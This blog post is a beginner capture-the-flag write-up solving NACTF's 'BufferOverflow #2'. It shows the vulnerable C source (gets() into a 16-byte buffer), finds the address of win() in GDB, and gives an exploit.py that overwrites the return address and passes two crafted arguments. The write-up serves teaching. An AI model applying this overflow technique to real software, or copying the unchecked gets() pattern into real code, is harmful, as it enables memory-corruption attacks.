---
layout: post
title: BufferOverflow-#2 
tags: [Binary Exploitation]
comments: true
---

This is a writeup on how i solved **BufferOverflow #2** from NACTF. I hope this will help beginners in binary exploitation while doing ctfs. This is a Beginner level challenge.

**CTF : https://www.nactf.com/**

#### Lets start..

![Crepe](/assets/images/bo2.1.png)

Download the binary to our system, make it executable and run the binary.

Like the previous challenge, this binary is also just printing the input back to us, behaving like a echo program.

![Crepe](/assets/images/bo2.2.png)

Lets analyse the source code of this binary to know how it is working.

Here is the source code:
~~~
#include <stdio.h>
#include <stdlib.h>

void win(long long arg1, int arg2)
{
    if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
    {
        puts("Close, but not quite.");
        exit(1);
    }
    printf("You win!\n");
    char buf[256];
    FILE* f = fopen("./flag.txt", "r");
    if (f == NULL)
    {
        puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
    }
    else
    {
        fgets(buf, sizeof(buf), f);
        printf("flag: %s\n", buf);
    }
}
void vuln()
{
    char buf[16];
    printf("Type something>");
    gets(buf);
    printf("You typed %s!\n", buf);
}

int main()
{
    /* Disable buffering on stdout */
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
~~~
From source code it is clear that we have to do the way we did for BufferOverflow #1 but we have to pass 2 arguments to win() function.

The function is checking the arguments we passed, we will get flag only after we pass the arguments in corrrect way.

But important thing is to note is the type of arg1 which is long long, which is 8 byte long.

Check more about 'C' data types.

So

arg1 =  0x0000000014B4DA55

arg2 =  0xF00DB4BE

Lets do it.

Like before first step is to controll eip register. I was managed to control eip register as you can see on the below image.

![Crepe](/assets/images/bo2.3.png)

So now we controlled eip, controlled eip with 4 B's (BBBB=0X42424242).

Next step is to find the address of win() function and overwrite eip with that so win() function will get executed.

On  GDB type **disas win** and take the starting address of win() function.

![Crepe](/assets/images/bo2.4.png)

adress of win() = 0x080491c2

Now we can craft our payload...

**payload = "A"*28 + address_of_win() +dummy_return + arg1 + arg2**

Create a file called exploit.py with the below contents.

exploit.py:
~~~
buffer = ""

#junk data
buffer += "A"*28 

#address of win() 0x080491c2
buffer += "\xc2\x91\x04\x08"

#dummy return address 0xf7e0b7a0
buffer += "\xa0\xb7\xe0\xf7"

#arg1 0x0000000014B4DA55
buffer += "\x55\xda\xb4\x14\x00\x00\x00\x00"

#arg2 0xF00DB4BE
buffer += "\xbe\xb4\x0d\xf0"

print buffer 
~~~

Lets do the final thing....

![Crepe](/assets/images/bo2.5.png)

So it is done.

Lets do it in the remote server...

![Crepe](/assets/images/bo2.6.png)

We got the flaaaaag ...    :)
